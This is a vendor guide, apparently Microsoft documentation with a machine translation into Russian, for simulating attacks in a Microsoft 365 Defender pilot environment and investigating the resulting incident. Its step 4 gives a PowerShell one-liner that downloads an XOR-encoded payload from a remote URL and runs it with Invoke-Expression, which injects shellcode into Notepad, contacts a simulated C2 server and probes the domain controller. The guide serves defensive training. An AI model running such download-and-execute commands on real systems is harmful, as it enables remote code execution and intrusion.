---
title: Запуск имитации атаки в пилотной среде Microsoft 365 Defender, изолированной среде для имитации атаки, реагирования, восстановления
description: Запустите имитацию атак Microsoft 365 Defender, чтобы узнать, как представлены оповещения и инциденты, получены сведения и быстро устраняются угрозы.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.date: 07/09/2021
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: ebea0a8eeed737712c55eb80b9ce3c68e06853c1
ms.sourcegitcommit: 718759c7146062841f7eb4a0a9a8bdddce0139b0
ms.translationtype: MT
ms.contentlocale: ru-RU
ms.lasthandoff: 07/15/2021
ms.locfileid: "53458616"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a><span data-ttu-id="34198-103">Запуск имитации атаки в Microsoft 365 Defender пилотной среде</span><span class="sxs-lookup"><span data-stu-id="34198-103">Run an attack simulation in a Microsoft 365 Defender pilot environment</span></span>


<span data-ttu-id="34198-104">Эта статья — [шаг 1 из 2](eval-defender-investigate-respond.md) в процессе выполнения расследования и реагирования на инцидент в Microsoft 365 Defender с помощью пилотной среды.</span><span class="sxs-lookup"><span data-stu-id="34198-104">This article is [Step 1 of 2](eval-defender-investigate-respond.md) in the process of performing an investigation and response of an incident in Microsoft 365 Defender using a pilot environment.</span></span> <span data-ttu-id="34198-105">Дополнительные сведения об этом процессе см. в статье [обзор.](eval-defender-investigate-respond.md)</span><span class="sxs-lookup"><span data-stu-id="34198-105">For more information about this process, see the [overview](eval-defender-investigate-respond.md) article.</span></span>

<span data-ttu-id="34198-106">После подготовки пилотной среды настало время проверить Microsoft 365 Defender и возможности автоматического расследования и восстановления, создав инцидент с имитацией атаки и используя портал Microsoft 365 Defender для расследования и реагирования. [](eval-defender-investigate-respond.md)</span><span class="sxs-lookup"><span data-stu-id="34198-106">After preparing your [pilot environment](eval-defender-investigate-respond.md), it's time to test Microsoft 365 Defender's incident response and automated investigation and remediation capabilities by creating an incident with a simulated attack and using the Microsoft 365 Defender portal to investigate and respond.</span></span>

<span data-ttu-id="34198-107">Инцидент в Microsoft 365 Defender — это коллекция коррелирующих оповещений и связанных данных, которые составляют историю атаки.</span><span class="sxs-lookup"><span data-stu-id="34198-107">An incident in Microsoft 365 Defender is a collection of correlated alerts and associated data that make up the story of an attack.</span></span>

<span data-ttu-id="34198-108">Microsoft 365 службы и приложения создают оповещения при обнаружении подозрительного или вредоносного события или действия.</span><span class="sxs-lookup"><span data-stu-id="34198-108">Microsoft 365 services and apps create alerts when they detect a suspicious or malicious event or activity.</span></span> <span data-ttu-id="34198-109">Отдельные оповещения предоставляют ценные подсказки о завершенной или продолжающейся атаке.</span><span class="sxs-lookup"><span data-stu-id="34198-109">Individual alerts provide valuable clues about a completed or ongoing attack.</span></span> <span data-ttu-id="34198-110">Однако в атаках обычно используются различные методы для различных типов сущностями, например устройств, пользователей и почтовых ящиков.</span><span class="sxs-lookup"><span data-stu-id="34198-110">However, attacks typically employ various techniques against different types of entities, such as devices, users, and mailboxes.</span></span> <span data-ttu-id="34198-111">Результатом является несколько оповещений для нескольких сущностями в клиенте.</span><span class="sxs-lookup"><span data-stu-id="34198-111">The result is multiple alerts for multiple entities in your tenant.</span></span>

>[!Note]
><span data-ttu-id="34198-112">Если вы совершенно новые для анализа безопасности и [](first-incident-overview.md) реагирования на инциденты, см. в ответе на первое поведение инцидента, чтобы получить экскурсию по типичному процессу анализа, исправлений и после инцидента обзора.</span><span class="sxs-lookup"><span data-stu-id="34198-112">If you are brand new to security analysis and incident response, see the [Respond to your first incident walkthrough](first-incident-overview.md) to get a guided tour of a typical process of analysis, remediation, and post-incident review.</span></span>
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a><span data-ttu-id="34198-113">Имитация атак с помощью Microsoft 365 Defender портала</span><span class="sxs-lookup"><span data-stu-id="34198-113">Simulate attacks with the Microsoft 365 Defender portal</span></span>

<span data-ttu-id="34198-114">Портал Microsoft 365 Defender имеет встроенные возможности для создания имитации атак на пилотную среду:</span><span class="sxs-lookup"><span data-stu-id="34198-114">The Microsoft 365 Defender portal has built-in capabilities to create simulated attacks on your pilot environment:</span></span>

- <span data-ttu-id="34198-115">Обучение имитации атаки для Microsoft 365 Defender для Office 365 [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator) на .</span><span class="sxs-lookup"><span data-stu-id="34198-115">Attack simulation training for Microsoft 365 Defender for Office 365 at [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).</span></span>
  
  <span data-ttu-id="34198-116">На портале Microsoft 365 Defender выберите обучение **& совместной > атаки.**</span><span class="sxs-lookup"><span data-stu-id="34198-116">In the Microsoft 365 Defender portal, select **Email & collaboration > Attack simulation training**.</span></span>

- <span data-ttu-id="34198-117">Учебные пособия по & для Microsoft 365 Defender для конечных точек [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations) по .</span><span class="sxs-lookup"><span data-stu-id="34198-117">Attack tutorials & simulations for Microsoft 365 Defender for Endpoints at [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).</span></span>

  <span data-ttu-id="34198-118">На портале Microsoft 365 Defender выберите **конечные точки > & моделирования.**</span><span class="sxs-lookup"><span data-stu-id="34198-118">In the Microsoft 365 Defender portal, select **Endpoints > Tutorials & simulations**.</span></span>

### <a name="defender-for-office-365-attack-simulation-training"></a><span data-ttu-id="34198-119">Обучение моделированию Office 365 Defender</span><span class="sxs-lookup"><span data-stu-id="34198-119">Defender for Office 365 Attack simulation training</span></span>

<span data-ttu-id="34198-120">Defender for Office 365 с Microsoft 365 E5 или Microsoft Defender для Office 365 Plan 2 включает обучение имитации атак для фишинговых атак.</span><span class="sxs-lookup"><span data-stu-id="34198-120">Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 includes attack simulation training for phishing attacks.</span></span> <span data-ttu-id="34198-121">Основные действия:</span><span class="sxs-lookup"><span data-stu-id="34198-121">The basic steps are:</span></span>

1. <span data-ttu-id="34198-122">Создание имитации</span><span class="sxs-lookup"><span data-stu-id="34198-122">Create a simulation</span></span>

   <span data-ttu-id="34198-123">Инструкции по созданию и отправке нового моделирования см. в инструкции по имитации [фишинговой атаки.](/microsoft-365/security/office-365-security/attack-simulation-training)</span><span class="sxs-lookup"><span data-stu-id="34198-123">For step by step instructions on how to create and send a new simulation, see [Simulate a phishing attack](/microsoft-365/security/office-365-security/attack-simulation-training).</span></span>

2. <span data-ttu-id="34198-124">Создание полезной нагрузки</span><span class="sxs-lookup"><span data-stu-id="34198-124">Create a payload</span></span>

   <span data-ttu-id="34198-125">Инструкции по созданию полезной нагрузки для использования в имитации см. в инструкции по созданию настраиваемой полезной нагрузки для обучения [имитации атаки.](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)</span><span class="sxs-lookup"><span data-stu-id="34198-125">For step by step instructions on how to create a payload for use within a simulation, see [Create a custom payload for Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).</span></span>

3. <span data-ttu-id="34198-126">Получение информации</span><span class="sxs-lookup"><span data-stu-id="34198-126">Gaining insights</span></span>

   <span data-ttu-id="34198-127">Инструкции по пошаговую информацию о том, как получить сведения с отчетами, см. в рублях [Gain insights through Attack simulation training.](/microsoft-365/security/office-365-security/attack-simulation-training-insights)</span><span class="sxs-lookup"><span data-stu-id="34198-127">For step by step instructions on how to gain insights with reporting, see [Gain insights through Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-insights).</span></span>

<span data-ttu-id="34198-128">Дополнительные сведения см. в [см. в рублях Simulations.](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)</span><span class="sxs-lookup"><span data-stu-id="34198-128">For more information, see [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).</span></span>

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a><span data-ttu-id="34198-129">Руководство по атаке defender для конечной точки & моделирования</span><span class="sxs-lookup"><span data-stu-id="34198-129">Defender for Endpoint attack tutorials & simulations</span></span>

<span data-ttu-id="34198-130">Вот моделирование Defender для конечных точек от Корпорации Майкрософт:</span><span class="sxs-lookup"><span data-stu-id="34198-130">Here are the Defender for Endpoint simulations from Microsoft:</span></span>

- <span data-ttu-id="34198-131">Отбрасыватель документа</span><span class="sxs-lookup"><span data-stu-id="34198-131">Document drops backdoor</span></span>
- <span data-ttu-id="34198-132">Автоматическое расследование (backdoor)</span><span class="sxs-lookup"><span data-stu-id="34198-132">Automated investigation (backdoor)</span></span>

<span data-ttu-id="34198-133">Существуют дополнительные имитации из Атак IQ и SafeBreach.</span><span class="sxs-lookup"><span data-stu-id="34198-133">There are additional simulations from Attack IQ and SafeBreach.</span></span> <span data-ttu-id="34198-134">Существует также набор учебных пособий.</span><span class="sxs-lookup"><span data-stu-id="34198-134">There are also a set of tutorials.</span></span>

<span data-ttu-id="34198-135">Для каждого моделирования или руководства:</span><span class="sxs-lookup"><span data-stu-id="34198-135">For each simulation or tutorial:</span></span>

1. <span data-ttu-id="34198-136">Скачайте и прочитайте соответствующий пакет документов с выбранным моделированием или сценарием.</span><span class="sxs-lookup"><span data-stu-id="34198-136">Download and read the corresponding walk through document provided with your selected simulation or scenario.</span></span>

2. <span data-ttu-id="34198-137">Скачайте файл моделирования.</span><span class="sxs-lookup"><span data-stu-id="34198-137">Download the simulation file.</span></span> <span data-ttu-id="34198-138">Вы можете скачать файл или скрипт на тестовом устройстве, но это не является обязательным.</span><span class="sxs-lookup"><span data-stu-id="34198-138">You can choose to download the file or script on the test device but it's not mandatory.</span></span>

3. <span data-ttu-id="34198-139">Запустите файл или сценарий моделирования на тестовом устройстве по инструкции при пройдите по документу.</span><span class="sxs-lookup"><span data-stu-id="34198-139">Run the simulation file or script on the test device as instructed in the walk through document.</span></span>

 <span data-ttu-id="34198-140">Дополнительные сведения см. в [веб-сайте Experience Microsoft Defender for Endpoint с помощью имитации атаки.](/microsoft-365/security/defender-endpoint/attack-simulations)</span><span class="sxs-lookup"><span data-stu-id="34198-140">For more information, see [Experience Microsoft Defender for Endpoint through simulated attack](/microsoft-365/security/defender-endpoint/attack-simulations).</span></span>

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a><span data-ttu-id="34198-141">Имитация атаки с помощью изолированного контроллера домена и клиентского устройства (необязательно)</span><span class="sxs-lookup"><span data-stu-id="34198-141">Simulate an attack with an isolated domain controller and client device (optional)</span></span>

<span data-ttu-id="34198-142">В этом необязательный упражнении реагирования на инцидент вы смоделируете атаку на изолированный контроллер доменных служб Active Directory Domain Services (AD DS) и устройство Windows 10 с помощью сценария PowerShell, а затем изучите, исправление и устранение инцидента.</span><span class="sxs-lookup"><span data-stu-id="34198-142">In this optional incident response exercise, you'll simulate an attack on an isolated Active Directory Domain Services (AD DS) domain controller and Windows 10 device using a PowerShell script and then investigate, remediate, and resolve the incident.</span></span>

<span data-ttu-id="34198-143">Сначала необходимо добавить конечные точки в пилотную среду.</span><span class="sxs-lookup"><span data-stu-id="34198-143">First, you need to add endpoints to your pilot environment.</span></span>

### <a name="add-pilot-environment-endpoints"></a><span data-ttu-id="34198-144">Добавление конечных точек пилотной среды</span><span class="sxs-lookup"><span data-stu-id="34198-144">Add pilot environment endpoints</span></span>

<span data-ttu-id="34198-145">Сначала необходимо добавить изолированный контроллер домена AD DS и устройство Windows 10 в пилотную среду.</span><span class="sxs-lookup"><span data-stu-id="34198-145">First, you need to add an isolated AD DS domain controller and a Windows 10 device to your pilot environment.</span></span>

1. <span data-ttu-id="34198-146">Убедитесь, что клиент пилотной среды [включил Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span><span class="sxs-lookup"><span data-stu-id="34198-146">Verify your pilot environment tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="34198-147">Убедитесь, что контроллер домена:</span><span class="sxs-lookup"><span data-stu-id="34198-147">Verify that your domain controller:</span></span>

   - <span data-ttu-id="34198-148">Выполняется Windows Server 2008 R2 или более поздней версии.</span><span class="sxs-lookup"><span data-stu-id="34198-148">Runs Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="34198-149">Отчеты [в Microsoft Defender для identity](/azure/security-center/security-center-wdatp) и включено [удаленное управление](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span><span class="sxs-lookup"><span data-stu-id="34198-149">Reports to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and has enabled [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="34198-150">Включена [система Microsoft Defender для удостоверений и Microsoft Cloud App Security интеграции.](/cloud-app-security/mdi-integration)</span><span class="sxs-lookup"><span data-stu-id="34198-150">Has [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) enabled.</span></span>
   - <span data-ttu-id="34198-151">Создается ли тестовый пользователь в тестовом домене.</span><span class="sxs-lookup"><span data-stu-id="34198-151">Has a test user is created in the test domain.</span></span> <span data-ttu-id="34198-152">Разрешения на уровне администратора не нужны.</span><span class="sxs-lookup"><span data-stu-id="34198-152">Administrator-level permissions are not needed.</span></span>

3. <span data-ttu-id="34198-153">Убедитесь, что ваше тестового устройства:</span><span class="sxs-lookup"><span data-stu-id="34198-153">Verify that your test device:</span></span>

   - <span data-ttu-id="34198-154">Выполняется Windows 10 версии 1903 или более поздней версии.</span><span class="sxs-lookup"><span data-stu-id="34198-154">Runs Windows 10 version 1903 or a later version.</span></span>
   - <span data-ttu-id="34198-155">Присоединяется к домену контроллера домена AD DS.</span><span class="sxs-lookup"><span data-stu-id="34198-155">Is joined to the AD DS domain controller domain.</span></span>
   - <span data-ttu-id="34198-156">Включено [антивирусная программа](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) включено.</span><span class="sxs-lookup"><span data-stu-id="34198-156">Has [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) enabled.</span></span> <span data-ttu-id="34198-157">Если у вас возникли проблемы с включением антивирусная программа , см. эту тему [устранения неполадок.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)</span><span class="sxs-lookup"><span data-stu-id="34198-157">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
   - <span data-ttu-id="34198-158">Находится [на борту в Microsoft Defender для конечной точки](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="34198-158">Is [onboarded to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="34198-159">Если вы используете группы клиентов и устройств, создайте специальную группу устройств для тестового устройства и нажмите ее на верхний уровень.</span><span class="sxs-lookup"><span data-stu-id="34198-159">If you use tenant and device groups, create a dedicated device group for the test device and push it to top level.</span></span>

<span data-ttu-id="34198-160">Одним из вариантов является возможность хозяйского контроллера домена AD DS и тестового устройства в качестве виртуальных машин в Microsoft Azure инфраструктурных службах.</span><span class="sxs-lookup"><span data-stu-id="34198-160">One alternative is to host your AD DS domain controller and test device as virtual machines in Microsoft Azure infrastructure services.</span></span> <span data-ttu-id="34198-161">Инструкции можно использовать на этапе [1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)смоделированного руководства лаборатории тестирования предприятия, но пропустить создание виртуальной машины APP1.</span><span class="sxs-lookup"><span data-stu-id="34198-161">You can use the instructions in [Phase 1 of the simulated enterprise Test Lab Guide](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), but skip the creation of the APP1 virtual machine.</span></span>

<span data-ttu-id="34198-162">Вот результат.</span><span class="sxs-lookup"><span data-stu-id="34198-162">Here is the result.</span></span>

![Конечные точки для среды оценки Defender с помощью смоделированной корпоративной лаборатории тестирования](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

<span data-ttu-id="34198-164">Вы смоделируете сложную атаку, которая использует передовые методы, чтобы скрыться от обнаружения.</span><span class="sxs-lookup"><span data-stu-id="34198-164">You'll simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="34198-165">При атаке были открыты сеансы блокировки сообщений сервера (SMB) на контроллерах домена и извлечены последние IP-адреса устройств пользователей.</span><span class="sxs-lookup"><span data-stu-id="34198-165">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="34198-166">Эта категория атак обычно не включает файлы, сброшенные на устройство жертвы, и они происходят исключительно в памяти.</span><span class="sxs-lookup"><span data-stu-id="34198-166">This category of attacks usually doesn't include files dropped on the victim's device and they occur solely in memory.</span></span> <span data-ttu-id="34198-167">Они "живут за счет земли", используя существующие системные и административные средства, и вводят свой код в системные процессы, чтобы скрыть их выполнение.</span><span class="sxs-lookup"><span data-stu-id="34198-167">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution.</span></span> <span data-ttu-id="34198-168">Такое поведение позволяет им уклоняться от обнаружения и сохраняться на устройстве.</span><span class="sxs-lookup"><span data-stu-id="34198-168">Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="34198-169">В этом моделировании пример сценария начинается со сценария PowerShell.</span><span class="sxs-lookup"><span data-stu-id="34198-169">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="34198-170">В реальном мире пользователь может быть обманут при запуске скрипта или сценарий может работать с удаленного подключения к другому компьютеру с ранее зараженного устройства, что указывает на то, что злоумышленник пытается двигаться по сети с другой стороны.</span><span class="sxs-lookup"><span data-stu-id="34198-170">In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network.</span></span> <span data-ttu-id="34198-171">Обнаружение этих скриптов может быть затруднено, так как администраторы также часто запускают сценарии удаленно для выполнения различных административных действий.</span><span class="sxs-lookup"><span data-stu-id="34198-171">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Атака Без файлов PowerShell с помощью схемы впрыска процесса и повторной обработки SMB](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="34198-173">Во время моделирования атака впрыскиивает код оболочки в казалось бы невинный процесс.</span><span class="sxs-lookup"><span data-stu-id="34198-173">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="34198-174">Сценарий требует использования notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="34198-174">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="34198-175">Мы выбрали этот процесс для моделирования, но злоумышленники, скорее всего, будут нацелены на длительный системный процесс, например svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="34198-175">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="34198-176">Затем код оболочки отправляется на контакт с сервером командно-диспетчерской системы (C2) злоумышленника, чтобы получить инструкции о том, как действовать дальше.</span><span class="sxs-lookup"><span data-stu-id="34198-176">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="34198-177">Сценарий пытается выполнять разведывательные запросы в отношении контроллера домена (DC).</span><span class="sxs-lookup"><span data-stu-id="34198-177">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="34198-178">Разведка позволяет злоумышленнику получать сведения о последних сведениях входа пользователя.</span><span class="sxs-lookup"><span data-stu-id="34198-178">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="34198-179">После получения злоумышленниками этой информации они могут перемещаться по сети, чтобы перейти к определенной конфиденциальной учетной записи.</span><span class="sxs-lookup"><span data-stu-id="34198-179">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="34198-180">Для достижения оптимальных результатов выполните инструкции по моделированию атак как можно ближе.</span><span class="sxs-lookup"><span data-stu-id="34198-180">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a><span data-ttu-id="34198-181">Запуск изолированного моделирования атаки контроллера домена AD DS</span><span class="sxs-lookup"><span data-stu-id="34198-181">Run the isolated AD DS domain controller attack simulation</span></span>

<span data-ttu-id="34198-182">Для запуска моделирования сценария атаки:</span><span class="sxs-lookup"><span data-stu-id="34198-182">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="34198-183">Убедитесь, что пилотная среда включает изолированный контроллер домена AD DS и Windows 10 устройство.</span><span class="sxs-lookup"><span data-stu-id="34198-183">Ensure that your pilot environment includes the isolated AD DS domain controller and Windows 10 device.</span></span>

2. <span data-ttu-id="34198-184">Во входе на тестовом устройстве с тестовой учетной записью пользователя.</span><span class="sxs-lookup"><span data-stu-id="34198-184">Sign in to the test device with the test user account.</span></span>

3. <span data-ttu-id="34198-185">Откройте окно Windows PowerShell на тестовом устройстве.</span><span class="sxs-lookup"><span data-stu-id="34198-185">Open a Windows PowerShell window on the test device.</span></span>

4. <span data-ttu-id="34198-186">Скопируйте следующий сценарий моделирования:</span><span class="sxs-lookup"><span data-stu-id="34198-186">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="34198-187">Если вы откроете эту статью в веб-браузере, могут возникнуть проблемы с копированием полного текста без потери определенных символов или введения дополнительных разрывов строк.</span><span class="sxs-lookup"><span data-stu-id="34198-187">If you open this article on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="34198-188">В этом случае скачайте этот документ и откройте его в Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="34198-188">If this is the case, download this document and open it on Adobe Reader.</span></span>

5. <span data-ttu-id="34198-189">Вклеить и запустить скопированные скрипты в окне PowerShell.</span><span class="sxs-lookup"><span data-stu-id="34198-189">Paste and run the copied script in the PowerShell window.</span></span>

> [!NOTE]
> <span data-ttu-id="34198-190">Если вы используете PowerShell с помощью протокола удаленного рабочего стола (RDP), используйте команду Type Clipboard Text в клиенте RDP, так как метод **CTRL-V** или метод вклейки правой кнопкой мыши может не работать.</span><span class="sxs-lookup"><span data-stu-id="34198-190">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="34198-191">Недавние версии PowerShell иногда также не принимают этот метод, вам может потребоваться скопировать Блокнот в памяти, скопировать его в виртуальной машине, а затем вклеить его в PowerShell.</span><span class="sxs-lookup"><span data-stu-id="34198-191">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="34198-192">Через несколько секунд приложение Блокнот откроется.</span><span class="sxs-lookup"><span data-stu-id="34198-192">A few seconds later, the Notepad app will open.</span></span> <span data-ttu-id="34198-193">Смоделированный код атаки будет вводиться в Блокнот.</span><span class="sxs-lookup"><span data-stu-id="34198-193">A simulated attack code will be injected into Notepad.</span></span> <span data-ttu-id="34198-194">Держите автоматически созданный экземпляр Блокнот открытым для полного сценария.</span><span class="sxs-lookup"><span data-stu-id="34198-194">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="34198-195">Смоделированный код атаки будет пытаться связываться с внешним IP-адресом (имитирующим сервер C2), а затем пытаться вести разведку в отношении контроллера домена через SMB.</span><span class="sxs-lookup"><span data-stu-id="34198-195">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="34198-196">Это сообщение будет отображаться на консоли PowerShell после завершения сценария.</span><span class="sxs-lookup"><span data-stu-id="34198-196">You'll see this message displayed on the PowerShell console when this script completes:</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="34198-197">Чтобы увидеть функцию Automated Incident and Response в действии, notepad.exe процесс.</span><span class="sxs-lookup"><span data-stu-id="34198-197">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="34198-198">Вы увидите, как автоматические инциденты и ответы останавливают Блокнот процесс.</span><span class="sxs-lookup"><span data-stu-id="34198-198">You'll see Automated Incident and Response stop the Notepad process.</span></span>

### <a name="investigate-the-incident-for-the-simulated-attack"></a><span data-ttu-id="34198-199">Расследование инцидента для имитации атаки</span><span class="sxs-lookup"><span data-stu-id="34198-199">Investigate the incident for the simulated attack</span></span>

> [!NOTE]
> <span data-ttu-id="34198-200">Перед тем, как мы пройдемся по этому моделированию, просмотрите следующее видео, чтобы узнать, как управление инцидентами помогает собрать связанные оповещения вместе в рамках процесса расследования, найти их на портале и как это может помочь вам в операциях по безопасности:</span><span class="sxs-lookup"><span data-stu-id="34198-200">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="34198-201">Перейдя на точку зрения аналитика SOC, вы можете начать исследовать атаку на Microsoft 365 Defender портале.</span><span class="sxs-lookup"><span data-stu-id="34198-201">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Defender portal.</span></span>

1. <span data-ttu-id="34198-202">Откройте портал [Microsoft 365 Defender .](https://security.microsoft.com/)</span><span class="sxs-lookup"><span data-stu-id="34198-202">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="34198-203">Из области навигации выберите **Инциденты & оповещения > инциденты**.</span><span class="sxs-lookup"><span data-stu-id="34198-203">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="34198-204">Новый инцидент для имитации атаки появится в очереди инцидента.</span><span class="sxs-lookup"><span data-stu-id="34198-204">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![Пример очереди инцидента](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="34198-206">Расследование атаки как одного инцидента</span><span class="sxs-lookup"><span data-stu-id="34198-206">Investigate the attack as a single incident</span></span>

<span data-ttu-id="34198-207">Microsoft 365 Defender сопоставляет аналитику и совмещает все связанные оповещения и расследования из различных продуктов в одну сущность инцидента.</span><span class="sxs-lookup"><span data-stu-id="34198-207">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="34198-208">При этом Microsoft 365 Defender более широкую историю атак, позволяющую аналитику SOC понимать сложные угрозы и реагировать на них.</span><span class="sxs-lookup"><span data-stu-id="34198-208">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="34198-209">Оповещения, созданные во время этого моделирования, связаны с той же угрозой, и в результате автоматически агрегируются как один инцидент.</span><span class="sxs-lookup"><span data-stu-id="34198-209">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="34198-210">Чтобы просмотреть инцидент:</span><span class="sxs-lookup"><span data-stu-id="34198-210">To view the incident:</span></span>

1. <span data-ttu-id="34198-211">Откройте портал [Microsoft 365 Defender .](https://security.microsoft.com/)</span><span class="sxs-lookup"><span data-stu-id="34198-211">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="34198-212">Из области навигации выберите **Инциденты & оповещения > инциденты**.</span><span class="sxs-lookup"><span data-stu-id="34198-212">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="34198-213">Выберите самый новый элемент, нажав на круг, расположенный слева от имени инцидента.</span><span class="sxs-lookup"><span data-stu-id="34198-213">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="34198-214">На боковой панели отображаются дополнительные сведения об инциденте, включая все связанные оповещения.</span><span class="sxs-lookup"><span data-stu-id="34198-214">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="34198-215">Каждый инцидент имеет уникальное имя, которое описывает его на основе атрибутов включенных в него оповещений.</span><span class="sxs-lookup"><span data-stu-id="34198-215">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

